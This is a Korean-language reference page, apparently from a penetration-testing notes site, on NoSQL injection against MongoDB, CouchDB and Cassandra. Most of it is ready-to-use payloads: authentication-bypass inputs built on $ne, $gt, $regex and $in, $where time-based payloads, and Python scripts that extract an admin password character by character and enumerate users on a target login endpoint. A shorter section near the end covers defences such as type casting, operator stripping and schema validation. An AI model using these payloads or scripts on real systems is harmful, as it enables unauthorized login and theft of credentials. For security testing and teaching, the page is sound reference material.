---
sidebar_position: 8
---

# NoSQL Injection

NoSQL 데이터베이스에 대한 Injection 공격 기법입니다.

## 기본 개념

NoSQL Injection은 NoSQL 데이터베이스(MongoDB, CouchDB, Redis 등)에서 사용자 입력을 적절히 검증하지 않아 발생하는 취약점입니다.

## MongoDB Injection

### 인증 우회

#### URL 파라미터

```bash
# 기본 우회
username=admin&password[$ne]=dummy
username[$ne]=dummy&password[$ne]=dummy

# 정규식
username[$regex]=.*&password[$regex]=.*
username[$regex]=^admin&password[$ne]=1

# Greater than
username[$gt]=&password[$gt]=
username=admin&password[$gt]=
```

#### JSON 페이로드

```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
```

#### POST 데이터

```bash
username[$ne]=admin&password[$ne]=pass
username=admin&password[$gt]=
username[$regex]=^adm&password[$ne]=1
```

### MongoDB 연산자

```javascript
// 비교 연산자
$eq  - 같음
$ne  - 같지 않음
$gt  - 크다
$gte - 크거나 같다
$lt  - 작다
$lte - 작거나 같다

// 논리 연산자
$and - AND
$or  - OR
$not - NOT
$nor - NOR

// 배열 연산자
$in  - 배열 내 존재
$nin - 배열 내 존재하지 않음
$all - 모든 요소 포함

// 기타
$regex - 정규식 매칭
$where - JavaScript 표현식
$exists - 필드 존재 여부
```

### 정규식을 통한 데이터 추출

비밀번호를 한 글자씩 추출:

```json
{"username": "admin", "password": {"$regex": "^a"}}     // False
{"username": "admin", "password": {"$regex": "^p"}}     // True
{"username": "admin", "password": {"$regex": "^pa"}}    // True
{"username": "admin", "password": {"$regex": "^pas"}}   // True
{"username": "admin", "password": {"$regex": "^pass"}}  // True
```

자동화 스크립트:

```python
import requests

charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""
url = "http://target.com/login"

while True:
    for char in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password + char}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += char
            print(f"Found: {password}")
            break
```

### JavaScript Injection

#### $where 연산자

```json
{"username": {"$where": "this.username == 'admin'"}}
{"$where": "this.username == 'admin' && this.password == 'pass'"}
{"$where": "sleep(5000)"}  // Time-based
{"$where": "function() { return true; }"}
```

#### 페이로드 예제

```javascript
// 항상 참
admin' || '1'=='1
admin' || ''=='
{"$where": "1==1"}

// Time-based
{"$where": "sleep(5000)"}
{"username": "admin", "password": {"$where": "sleep(5000)"}}
```

### 연산자 남용

#### $ne (Not Equal)

```json
// 인증 우회
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
```

#### $gt (Greater Than)

```json
{"username": "admin", "password": {"$gt": ""}}
{"age": {"$gt": 0}}  // 모든 양수
```

#### $in

```json
{"username": {"$in": ["admin", "administrator", "root"]}}
{"role": {"$in": ["admin", "superuser"]}}
```

## 다양한 NoSQL 데이터베이스

### CouchDB

```bash
# 인증 우회
{"username": "admin", "password": {"$ne": null}}
```

### Cassandra (CQL Injection)

```sql
' OR 1=1--
admin' OR '1'='1
```

## 탐지 기법

### 수동 탐지

```bash
# 특수 문자 테스트
'
"
\
$
{
}

# 연산자 테스트
[$ne]
[$gt]
[$regex]
```

### 에러 메시지

```json
{"username": {"$ne": 1}}  // Type error
{"username": {"invalid": "test"}}  // Unknown operator
```

## HTTP 헤더 Injection

### Content-Type 조작

```bash
# application/json으로 변경
Content-Type: application/json

# 페이로드
{"username": {"$ne": null}, "password": {"$ne": null}}
```

## Blind NoSQL Injection

### Boolean-Based

```python
# True/False 응답 차이로 데이터 추출
payloads = [
    {"username": "admin", "password": {"$regex": "^a"}},  # False
    {"username": "admin", "password": {"$regex": "^p"}},  # True
]
```

### Time-Based

```json
{"username": "admin", "password": {"$where": "sleep(5000) || true"}}
```

## 실제 공격 예제

### 로그인 우회

```bash
# Original
POST /login
username=admin&password=secret

# Injection
POST /login
username[$ne]=admin&password[$ne]=secret

# JSON
POST /login
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

### 데이터 열거

```python
import requests

users = []
charset = "abcdefghijklmnopqrstuvwxyz"

for char in charset:
    payload = {"username": {"$regex": f"^{char}"}}
    r = requests.post("http://target.com/users", json=payload)
    if r.status_code == 200:
        # 해당 문자로 시작하는 사용자 존재
        users.append(char)
```

## 방어 기법

### 입력 검증

```javascript
// ❌ Bad
db.users.find({ username: req.body.username })

// ✅ Good
const username = String(req.body.username)
db.users.find({ username: username })
```

### 연산자 필터링

```javascript
// 연산자 제거
function sanitize(input) {
    if (typeof input === 'object') {
        for (let key in input) {
            if (key.startsWith('$')) {
                delete input[key]
            }
        }
    }
    return input
}
```

### 화이트리스트

```javascript
const allowedFields = ['username', 'email']
const query = {}

for (let field of allowedFields) {
    if (req.body[field]) {
        query[field] = String(req.body[field])
    }
}
```

### ODM/ORM 사용

```javascript
// Mongoose Schema
const UserSchema = new Schema({
    username: String,
    password: String
})

// 타입 검증 자동 수행
User.findOne({ username: req.body.username })
```

## 도구

- **NoSQLMap**: NoSQL Injection 자동화 도구
- **Burp Suite**: Manual testing
- **Custom Scripts**: Python/JavaScript로 자동화

## 참고

- MongoDB가 가장 흔한 타겟
- `$ne`, `$regex` 연산자가 자주 악용됨
- JSON 페이로드로 전송 시 더 효과적
- Content-Type을 application/json으로 변경
- `$where` 연산자는 보안상 비활성화 권장
- Schema validation으로 방어 가능
- ODM/ORM 사용 시 자동 타입 검증
- 에러 메시지를 통한 정보 유출 주의
